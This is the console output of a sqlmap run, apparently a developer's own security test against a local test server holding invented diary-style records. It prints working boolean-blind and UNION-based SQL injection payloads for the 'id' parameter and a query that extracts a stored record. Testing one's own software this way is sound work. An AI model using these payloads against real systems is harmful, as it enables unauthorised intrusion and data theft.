        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.9.32#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:42:29 /2026-10-02/



[16:42:29] [WARNING] using '/Users/josef/Documents/Development/Regelmässig/angreifer/results/20261002T144228.273771Z/sqlmap-plain' as the output directory

[16:42:29] [INFO] testing connection to the target URL

[16:42:29] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.14.6')

[16:42:29] [INFO] checking if the target is protected by some kind of WAF/IPS

[16:42:30] [INFO] testing if the target URL content is stable

[16:42:30] [INFO] target URL content is stable

[16:42:30] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be SQL injectable

[16:42:30] [INFO] testing for SQL injection on GET parameter 'id'

[16:42:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

[16:42:30] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="{"date":"2026-09-29","selections":{},"customValues":{},"appointments":[],"note":"Sichtbarer Kontrolldatensatz","temperature":36.7,"weight":null}")

[16:42:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'

[16:42:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found

[16:42:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test

[16:42:30] [INFO] target URL appears to have 2 columns in query

[16:42:30] [WARNING] reflective value(s) found and filtering out

[16:42:30] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 16 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 8631=8631

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=2 UNION ALL SELECT NULL,CHAR(113,112,107,107,113)||CHAR(86,108,119,79,102,81,87,116,72,114,104,72,109,76,122,119,74,115,117,114,79,72,66,79,88,76,106,77,99,104,73,83,72,112,99,110,80,121,65,78)||CHAR(113,122,107,107,113)-- mNXF
---

[16:42:30] [INFO] testing SQLite

[16:42:30] [INFO] confirming SQLite

[16:42:30] [INFO] actively fingerprinting SQLite

[16:42:30] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite

[16:42:30] [INFO] fetching SQL SELECT statement query output: 'SELECT hex(payload) FROM day_entries WHERE id=1'
SELECT hex(payload) FROM day_entries WHERE id=1: '7B2264617465223A22323032362D30392D3238222C2273656C656374696F6E73223A7B7D2C22637573746F6D56616C756573223A7B7D2C226170706F696E746D656E7473223A5B5D2C226E6F7465223A22455246554E44454E2D4C41424F522D4B45494E452D504552534F4E454E444154454E2D3230323630393238222C2274656D7065726174757265223A33362E372C22776569676874223A6E756C6C7D'

[16:42:30] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 9 times

[16:42:30] [INFO] fetched data logged to text files under '/Users/josef/Documents/Development/Regelmässig/angreifer/results/20261002T144228.273771Z/sqlmap-plain/127.0.0.1'

[*] ending @ 16:42:30 /2026-10-02/

